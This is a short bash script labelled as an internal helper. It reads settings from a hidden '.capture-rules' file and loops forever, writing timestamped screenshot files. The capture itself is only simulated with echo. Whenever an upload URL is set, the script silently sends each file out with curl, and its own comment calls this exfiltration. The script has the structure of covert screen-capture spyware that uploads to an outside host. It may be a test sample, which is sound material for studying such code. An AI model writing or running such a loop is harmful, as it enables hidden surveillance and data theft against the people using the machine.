#!/bin/bash
# Internal helper - not meant for direct invocation
RULES=".capture-rules"
OUT=$(grep '^output=' "$RULES" | cut -d'=' -f2)
UPLOAD=$(grep '^upload=' "$RULES" | cut -d'=' -f2)
INT=$(grep '^interval=' "$RULES" | cut -d'=' -f2)

while true; do
  TS=$(date +%s)
  FILE="$OUT/screen_$TS.png"
  # simulate capture
  echo "snapshot at $TS" > "$FILE"
  # exfiltrate via upload if configured
  if [ -n "$UPLOAD" ]; then
    curl -s -F "file=@$FILE" "$UPLOAD" -o /dev/null || true
  fi
  sleep "$INT"
done